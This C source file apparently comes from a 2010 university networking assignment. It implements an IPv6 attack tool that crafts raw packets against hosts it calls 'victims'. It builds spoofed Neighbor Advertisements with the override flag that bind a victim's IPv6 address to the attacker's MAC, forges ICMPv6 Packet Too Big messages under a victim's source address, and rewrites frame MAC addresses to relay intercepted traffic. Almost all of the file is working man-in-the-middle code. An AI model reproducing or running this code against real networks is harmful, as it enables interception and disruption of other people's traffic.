/******************************************************************
 * Data : 30.11.2010
 * Disciplina   : Redes - PUCRS
 * Professora	: Ana Benso
 *
 * Autores  : Cristiano Bolla Fernandes
 *          : Benito Michelon
 *****************************************************************/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#include <netinet/ether.h>
#include <netinet/ip6.h>
#include <netinet/icmp6.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

#include <disturber.h>
#include <device.h>
#include <victims.h>

#define IPV6_VERSION 6 << 4
#define IP6_MIN_MTU 1280

typedef struct pseudo_header {
	struct in6_addr ph_src;
	struct in6_addr ph_dst;
	u_int32_t ph_len;
	u_int8_t ph_zero[3];
	u_int8_t ph_nxt;
} pseudo_header;

void debug_packet(char *packet) {
	struct ethhdr *eth;
	struct ip6_hdr *ip6;
	struct icmp6_hdr *icmpv6;
	struct tcphdr *tcp;
	char addr[INET6_ADDRSTRLEN];

	eth = (struct ethhdr *)packet;
	ip6 = (struct ip6_hdr *)((char *)eth + sizeof(struct ethhdr));

	if (ip6->ip6_nxt != IPPROTO_TCP && ip6->ip6_nxt != IPPROTO_ICMPV6)
		return;

	printf("Ethernet information\n");
	printf("\tsource: %s\n", ether_ntoa((struct ether_addr *)eth->h_source));
	printf("\tdestination: %s\n", ether_ntoa((struct ether_addr *)eth->h_dest));

	printf("IPv6 information\n");
	inet_ntop(AF_INET6, ip6->ip6_src.s6_addr, addr, INET6_ADDRSTRLEN);
	printf("\tsource: %s\n", addr);

	memset(addr, 0, INET6_ADDRSTRLEN);
	inet_ntop(AF_INET6, ip6->ip6_dst.s6_addr, addr, INET6_ADDRSTRLEN);
	printf("\tdestination: %s\n", addr);
	printf("\tpayload length: %d bytes\n", ntohs(ip6->ip6_plen));

	switch (ip6->ip6_nxt) {
		case IPPROTO_ICMPV6:
			icmpv6 = (struct icmp6_hdr *)((char *)ip6 + sizeof(struct ip6_hdr));
			printf("ICMPv6 information\n");
			printf("\tcode: %d\n", icmpv6->icmp6_code);
			printf("\ttype: %d\n", icmpv6->icmp6_type);
			printf("\tcrc: 0x%x\n", icmpv6->icmp6_cksum);
			break;
		case IPPROTO_TCP:
			tcp = (struct tcphdr *)((char *)ip6 + sizeof(struct ip6_hdr));
			printf("TCP information\n");
			printf("\tdest port: %d\n", tcp->dest);
			printf("\tsrc port: %d\n", tcp->source);
			printf("\tseq: 0x%x\n", tcp->seq);
			printf("\tcrc: 0x%x\n", tcp->check);
			break;
		default:
			break;
	}
	printf("\n");
}

static unsigned short in_cksum(const unsigned char *addr, int len) {
	int nleft = len;
	unsigned int sum = 0;
	unsigned short *w = (unsigned short *)addr;
	unsigned short answer = 0;

	while (nleft > 1) {
		sum += *w++;
		nleft -= 2;
	}

	if (nleft == 1) {
		*(unsigned char *)(&answer) = *(const unsigned char *)w;
		sum += answer;
	}

	sum = (sum >> 16) + (sum & 0xFFFF);
	sum += (sum >> 16);
	answer = ~sum;

	return answer;
}

static unsigned short icmp6_cksum(struct ip6_hdr *ip6) {
	unsigned short sum = 0;
	unsigned char *buf;
	struct icmp6_hdr *icmp6, *tmp;
	struct pseudo_header *ph;

	//TODO: Check for memory overrun
	buf = malloc(sizeof(struct pseudo_header) + ntohs(ip6->ip6_plen));
	memset(buf, 0, sizeof(struct pseudo_header) + ntohs(ip6->ip6_plen));
	ph = (struct pseudo_header *)buf;
	icmp6 = (struct icmp6_hdr *)((char *)buf + sizeof(struct ip6_hdr));

	memcpy(&(ph->ph_src), &(ip6->ip6_src), sizeof(struct in6_addr));
	memcpy(&(ph->ph_dst), &(ip6->ip6_dst), sizeof(struct in6_addr));
	ph->ph_nxt = IPPROTO_ICMPV6;
	ph->ph_len = ip6->ip6_plen;

	tmp = (struct icmp6_hdr *)((char *)ip6 + sizeof(struct ip6_hdr));
	memcpy(icmp6, tmp, ntohs(ph->ph_len));

	sum = in_cksum(buf, sizeof(struct pseudo_header) + ntohs(ph->ph_len));

	return sum;
}

// WARN: needs to be freed
char *alloc_pkt2big(struct victim *svic, struct victim *dvic, struct ip6_hdr *pkt) {
	struct ethhdr *eth;
	struct ip6_hdr *ip6;
	struct icmp6_hdr *icmp6;
	char *packet;
	unsigned int len;

	if (!victim_info_complete(svic) || !victim_info_complete(dvic) || pkt == NULL)
		return NULL;

	len = sizeof(struct ethhdr) +
		sizeof(struct ip6_hdr) +
		sizeof(struct icmp6_hdr) +
		sizeof(struct ip6_hdr) + ntohs(pkt->ip6_plen);

	packet = malloc(len);
	memset(packet, 0, len);

	/* Ethernet Header */
	eth = (struct ethhdr *)packet;
	eth->h_proto = htons(ETH_P_IPV6);
	memcpy(eth->h_source, &device.hwaddr, ETH_ALEN);
	memcpy(eth->h_dest, &dvic->hwaddr, ETH_ALEN);

	/* IPv6 Header */
	ip6 = (struct ip6_hdr *)((char *)eth + sizeof(struct ethhdr));
	ip6->ip6_hops = 255;
	ip6->ip6_vfc = IPV6_VERSION;
	ip6->ip6_dst = dvic->ipv6;
	ip6->ip6_src = svic->ipv6;
	ip6->ip6_plen = htons(len - (sizeof(struct ethhdr) + sizeof(struct ip6_hdr)));
	ip6->ip6_nxt = IPPROTO_ICMPV6;

	/* ICMPv6 Header */
	icmp6 = (struct icmp6_hdr *)((char *)ip6 + sizeof(struct ip6_hdr));
	icmp6->icmp6_type = ICMP6_PACKET_TOO_BIG;
	icmp6->icmp6_mtu = htonl(IP6_MIN_MTU);

	/* Adding the packet that was too big.. */
	memcpy(((char *)icmp6 + sizeof(struct icmp6_hdr)), pkt,
			htons(pkt->ip6_plen) + sizeof(struct ip6_hdr));

	icmp6->icmp6_cksum = icmp6_cksum(ip6);

	return packet;
}

// WARN:  needs to be freed
char *alloc_ndsolicit(struct in6_addr *addr) {
	struct ethhdr *eth;
	struct ip6_hdr *ip6;
	struct icmp6_hdr *icmp6;
	struct nd_neighbor_solicit *nd;
	struct nd_opt_hdr *opt;
	char *packet, *data;
	unsigned int len = sizeof(struct ethhdr) +
						sizeof(struct ip6_hdr) +
						sizeof(struct nd_neighbor_solicit) +
						sizeof(struct nd_opt_hdr) +
						ETH_ALEN;

	if (!addr)
		return NULL;

	packet = malloc(len);
	memset(packet, 0, len);

	/* Ethernet Header */
	eth = (struct ethhdr *)packet;
	eth->h_proto = htons(ETH_P_IPV6);
	memcpy(eth->h_source, &device.hwaddr, ETH_ALEN);

	/* IPv6 Header */
	ip6 = (struct ip6_hdr *)((char *)eth + sizeof(struct ethhdr));
	/* Sending to multicast IPv6 (rfc4291) */
	inet_pton(AF_INET6, "ff02::1:ff00:0", ip6->ip6_dst.s6_addr);
	memcpy(&ip6->ip6_dst.s6_addr[13], &addr->s6_addr[13], 3);

	ip6->ip6_hops = 255;
	ip6->ip6_vfc = IPV6_VERSION;
	ip6->ip6_nxt = IPPROTO_ICMPV6;
	ip6->ip6_src = device.ipv6;
	ip6->ip6_plen = htons(len - (sizeof(struct ethhdr) + sizeof(struct ip6_hdr)));

	/* Multicast ethernet address (rfc3307) */
	memcpy(eth->h_dest, ether_aton("33:33:00:00:00:00"), ETH_ALEN);
	memcpy(&eth->h_dest[ETH_ALEN - 4], &ip6->ip6_dst.s6_addr[12], 4);

	/* ICMPv6 Header */
	icmp6 = (struct icmp6_hdr *)((char *)ip6 + sizeof(struct ip6_hdr));
	icmp6->icmp6_type = ND_NEIGHBOR_SOLICIT;

	/* ND Solicit */
	nd = (struct nd_neighbor_solicit *)icmp6;
	memcpy(&nd->nd_ns_target, addr, sizeof(struct in6_addr));

	/* Options */
	opt = (struct nd_opt_hdr *)((char *)nd + sizeof(struct nd_neighbor_solicit));
	opt->nd_opt_type = ND_OPT_SOURCE_LINKADDR;
	opt->nd_opt_len = 1;	/* in units of 8 octets */
	data = (char *)((char *)opt + sizeof(struct nd_opt_hdr));
	memcpy(data, &device.hwaddr, ETH_ALEN);

	icmp6->icmp6_cksum = icmp6_cksum(ip6);

	return packet;
}

// WARN:  needs to be freed
/* source victim data, dest victim */
char *alloc_ndadvert(struct victim *svic, struct victim *dvic) {
	struct ethhdr *eth;
	struct ip6_hdr *ip6;
	struct icmp6_hdr *icmp6;
	struct nd_neighbor_advert *nd;
	struct nd_opt_hdr *opt;
	char *hwaddr;
	char *packet;
	unsigned int len = sizeof(struct ethhdr) +
					sizeof(struct ip6_hdr) +
					sizeof(struct nd_neighbor_advert) +
					sizeof(struct nd_opt_hdr) +
					ETH_ALEN;

	if (!svic || !dvic)
		return NULL;

	packet = malloc(len);
	memset(packet, 0, len);

	/* Ethernet Header */
	eth = (struct ethhdr *)packet;
	eth->h_proto = htons(ETH_P_IPV6);
	memcpy(eth->h_source, &device.hwaddr, ETH_ALEN);
	memcpy(eth->h_dest, &dvic->hwaddr, ETH_ALEN);

	/* IPv6 Header */
	ip6 = (struct ip6_hdr *)((char *)eth + sizeof(struct ethhdr));
	ip6->ip6_hops = 255;
	ip6->ip6_vfc = IPV6_VERSION;
	ip6->ip6_dst = dvic->ipv6;
	ip6->ip6_src = svic->ipv6;
	ip6->ip6_plen = htons(len - (sizeof(struct ethhdr) + sizeof(struct ip6_hdr)));
	ip6->ip6_nxt = IPPROTO_ICMPV6;

	/* ICMPv6 Header */
	icmp6 = (struct icmp6_hdr *)((char *)ip6 + sizeof(struct ip6_hdr));
	icmp6->icmp6_type = ND_NEIGHBOR_ADVERT;
	icmp6->icmp6_data8[0] = ND_NA_FLAG_OVERRIDE | ND_NA_FLAG_SOLICITED;

	/* ND Advertise */
	nd = (struct nd_neighbor_advert *)icmp6;
	nd->nd_na_target = svic->ipv6;

	/* Options */
	opt = (struct nd_opt_hdr *)((char *)nd + sizeof(struct nd_neighbor_advert));
	opt->nd_opt_type = ND_OPT_TARGET_LINKADDR;
	opt->nd_opt_len = 1;	/* in units of 8 octets */
	hwaddr = (char *)((char *)opt + sizeof(struct nd_opt_hdr));
	memcpy(hwaddr, &device.hwaddr, ETH_ALEN);

	icmp6->icmp6_cksum = icmp6_cksum(ip6);

	return packet;
}

void fake_packet(char *packet, struct victim *dvic) {
	struct ethhdr *eth;

	eth = (struct ethhdr *)packet;

	memcpy(eth->h_source, &device.hwaddr, ETH_ALEN);
	memcpy(eth->h_dest, &dvic->hwaddr, ETH_ALEN);
}
